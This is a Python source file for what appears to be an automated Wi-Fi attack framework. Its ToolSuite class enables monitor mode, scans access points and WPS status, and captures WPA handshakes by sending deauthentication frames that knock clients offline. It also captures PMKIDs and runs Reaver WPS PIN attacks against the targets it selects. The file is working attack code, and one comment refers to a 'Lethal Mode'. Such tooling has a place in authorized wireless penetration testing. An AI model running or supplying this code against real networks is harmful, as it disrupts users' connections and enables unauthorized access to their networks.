import subprocess
import time
import random
from typing import List, Dict, Optional
from core.logger import log
from core.knowledge_base import KnowledgeBase, NetworkTarget
from core.wrappers.hcx import HCXDumptoolWrapper
from core.wrappers.aircrack import AireplayWrapper
from core.wrappers.reaver import ReaverWrapper

class ToolSuite:
    def __init__(self):
        self.kb = KnowledgeBase()
        dry = self.kb.environment.dry_run
        
        # Initialize sub-wrappers
        self.hcx = HCXDumptoolWrapper(dry_run=dry)
        self.air = AireplayWrapper(dry_run=dry)
        self.reaver = ReaverWrapper(dry_run=dry)

    def _run_command(self, cmd: List[str]) -> str:
        if self.kb.environment.dry_run:
            log.debug(f"[DRY-RUN] Executing: {' '.join(cmd)}")
            return ""
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            return result.stdout
        except Exception as e:
            log.error(f"Command failed: {e}")
            return ""

    def list_interfaces(self) -> List[str]:
        """
        Returns a list of available wireless interfaces.
        """
        if self.kb.environment.dry_run:
            return ["wlan0", "wlan1", "wlan2"]
            
        try:
            result = subprocess.run(["iw", "dev"], capture_output=True, text=True)
            interfaces = []
            for line in result.stdout.split('\n'):
                if "Interface" in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        interfaces.append(parts[1])
            
            # Fallback if iw dev fails or returns nothing
            if not interfaces:
                result = subprocess.run(["ip", "-o", "link"], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if "wlan" in line:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            interfaces.append(parts[1].strip())
            
            return sorted(list(set(interfaces)))
        except Exception as e:
            log.error(f"Failed to list interfaces: {e}")
            return []

    def enable_monitor_mode(self, interface: str) -> str:
        log.info(f"Enabling monitor mode on {interface}...")
        if self.kb.environment.dry_run:
            self.kb.environment.mon_interface = f"{interface}mon"
            return f"{interface}mon"
        
        try:
            # Kill processes that might interfere with monitor mode
            subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Start monitor mode
            result = subprocess.run(["airmon-ng", "start", interface], capture_output=True, text=True)
            
            # Determine the monitor interface name
            # Usually it's interface + "mon", but we can check to be sure
            mon_interface = f"{interface}mon"
            
            # Verify the interface was created
            result = subprocess.run(["iw", "dev"], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if "Interface" in line and interface in line and "mon" in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        mon_interface = parts[1]
                        break
            
            # Additional verification that the interface is actually in monitor mode
            try:
                mode_result = subprocess.run(["iw", "dev", mon_interface, "info"], capture_output=True, text=True)
                if "type monitor" in mode_result.stdout:
                    log.info(f"Monitor mode successfully enabled on {mon_interface}")
                else:
                    log.warning(f"Interface {mon_interface} might not be in monitor mode")
            except:
                log.warning(f"Could not verify monitor mode on {mon_interface}")
            
            return mon_interface
        except Exception as e:
            log.error(f"Failed to enable monitor mode: {e}")
            return f"{interface}mon"  # Return a fallback name

    def scan_networks(self, interface: str, duration: int = 10) -> List[NetworkTarget]:
        # Basic scanning via airodump (mocked or real)
        # In Lethal Mode, we also scan for WPS now
        log.info(f"Scanning for networks (and WPS) on {interface} for {duration}s...")
        
        import tempfile
        import os
        import csv
        
        # Create temporary file for airodump-ng output
        temp_csv = tempfile.mktemp(suffix='.csv')
        temp_cap = temp_csv.replace('.csv', '.cap')
        
        # Run airodump-ng to scan for networks
        if not self.kb.environment.dry_run:
            try:
                # Start airodump-ng scan
                scan_cmd = [
                    "airodump-ng",
                    interface,
                    "--write", temp_csv[:-4],  # Without .csv extension
                    "--output-format", "csv",
                    "--uptime",
                    "--channel", "1-11",  # Scan common channels
                    "--timeout", str(duration)  # Set timeout
                ]
                
                result = subprocess.run(scan_cmd, capture_output=True, text=True, timeout=duration+5)
                
                # Parse the CSV output from airodump-ng
                targets = []
                if os.path.exists(temp_csv):
                    with open(temp_csv, 'r') as f:
                        content = f.read()
                        
                        # Find the section with AP data
                        lines = content.split('\n')
                        ap_section = False
                        for line in lines:
                            if 'BSSID' in line and 'First time seen' in line:
                                ap_section = True
                                continue
                            
                            if ap_section:
                                if line.strip() == '' or 'Station MAC' in line:
                                    ap_section = False
                                    continue
                                
                                # Parse AP data
                                # Format: BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key
                                fields = []
                                current_field = ""
                                in_quotes = False
                                
                                # Manual CSV parsing due to potential commas in SSID names
                                for char in line:
                                    if char == '"' and not in_quotes:
                                        in_quotes = True
                                    elif char == '"' and in_quotes:
                                        in_quotes = False
                                    elif char == ',' and not in_quotes:
                                        fields.append(current_field.strip())
                                        current_field = ""
                                    else:
                                        current_field += char
                                fields.append(current_field.strip())
                                
                                if len(fields) >= 15:
                                    bssid = fields[0].strip()
                                    ssid = fields[13].strip().strip('"')
                                    channel = int(fields[3].strip()) if fields[3].strip().isdigit() else 1
                                    encryption = fields[5].strip()
                                    signal_strength = int(fields[8].strip()) if fields[8].strip().lstrip('-').isdigit() else -80
                                    
                                    if bssid != "00:00:00:00:00:00" and ssid:  # Valid AP
                                        target = NetworkTarget(
                                            bssid=bssid,
                                            ssid=ssid,
                                            channel=channel,
                                            encryption=encryption,
                                            signal_strength=signal_strength
                                        )
                                        targets.append(target)
                
            except subprocess.TimeoutExpired:
                log.warning("Airodump-ng scan timed out")
                targets = []
            except Exception as e:
                log.error(f"Airodump-ng scan failed: {e}")
                targets = []
            
            # Clean up temporary files
            try:
                if os.path.exists(temp_csv):
                    os.remove(temp_csv)
                temp_files = [temp_csv.replace('.csv', ext) for ext in ['.cap', '-01.csv', '-01.cap']]
                for temp_file in temp_files:
                    if os.path.exists(temp_file):
                        os.remove(temp_file)
            except:
                pass  # Don't worry about cleanup errors
        
        else:
            # Dry run - keep original mock data
            time.sleep(1) # Simulate work
            t1 = NetworkTarget(
                bssid="00:11:22:33:44:55", 
                ssid="Corp_WiFi", 
                channel=6, 
                encryption="WPA2", 
                signal_strength=-50,
                wps_enabled=True,
                wps_locked=False
            )
            t2 = NetworkTarget(
                bssid="AA:BB:CC:DD:EE:FF", 
                ssid="Free_Guest", 
                channel=1, 
                encryption="OPEN", 
                signal_strength=-70
            )
            targets = [t1, t2]

        # 2. Run WPS scan (wash) and overlay data
        wps_data = self.reaver.scan_wps(interface)
        for t in targets:
            if t.bssid in wps_data:
                t.wps_enabled = True
                t.wps_locked = wps_data[t.bssid]["locked"]
                t.wps_version = wps_data[t.bssid]["version"]
                
        return targets

    def capture_handshake(self, interface: str, target: NetworkTarget, duration: int = 30) -> bool:
        # Classic Deauth + Capture
        log.info(f"Initiating Handshake Capture on {target.ssid}...")
        
        import tempfile
        import os
        
        # Create temporary file for airodump-ng capture
        temp_pcap = tempfile.mktemp(suffix='.cap')
        
        # Start airodump-ng in background to capture the handshake
        dump_cmd = [
            "airodump-ng",
            "-c", str(target.channel),  # Set to target's channel
            "--bssid", target.bssid,    # Filter for our target
            "-w", temp_pcap[:-4],       # Write to file (without .cap extension)
            "--output-format", "pcap",
            interface
        ]
        
        # Start airodump-ng in a separate process
        import subprocess
        dump_process = subprocess.Popen(
            dump_cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        # Wait a moment for airodump to initialize
        time.sleep(2)
        
        # Run deauth attack to force clients to reconnect
        self.air.deauth(interface, target.bssid)
        
        # Wait for potential handshake capture
        time.sleep(duration)
        
        # Stop airodump-ng
        dump_process.terminate()
        try:
            dump_process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            dump_process.kill()
        
        # Check if handshake was captured by checking the file
        pcap_file = temp_pcap[:-4] + "-01.cap"  # airodump-ng naming convention
        handshake_found = False
        
        if os.path.exists(pcap_file):
            # Use airdecap-ng to test if there's a valid handshake
            test_cmd = ["airdecap-ng", "-b", target.bssid, pcap_file]
            result = subprocess.run(test_cmd, capture_output=True, text=True)
            
            # Check output for successful handshake detection
            if "Handshakes" in result.stdout:
                handshake_found = True
                target.handshake_captured = True
            else:
                # Alternative check: use tshark to look for EAPOL packets
                tshark_cmd = [
                    "tshark",
                    "-r", pcap_file,
                    "-Y", "eapol && wlan.sa==" + target.bssid,
                    "-T", "fields",
                    "-e", "frame.time"
                ]
                tshark_result = subprocess.run(tshark_cmd, capture_output=True, text=True)
                if tshark_result.returncode == 0 and len(tshark_result.stdout.strip()) > 0:
                    handshake_found = True
                    target.handshake_captured = True
        
        # Cleanup temporary files
        try:
            if os.path.exists(pcap_file):
                os.remove(pcap_file)
            # Remove other airodump-ng files that might have been created
            possible_files = [f"{temp_pcap[:-4]}-{i:02d}.cap" for i in range(1, 10)]
            for f in possible_files:
                if os.path.exists(f):
                    os.remove(f)
        except:
            pass  # Don't worry about cleanup errors
        
        return handshake_found
        
    def capture_pmkid(self, interface: str, target: NetworkTarget) -> bool:
        success = self.hcx.capture_pmkid(interface, target.bssid)
        if success:
            target.pmkid_captured = True
        return success
        
    def attack_wps(self, interface: str, target: NetworkTarget) -> bool:
        pin = self.reaver.attack_wps(interface, target.bssid)
        if pin:
            target.wps_pin = pin
            return True
        return False
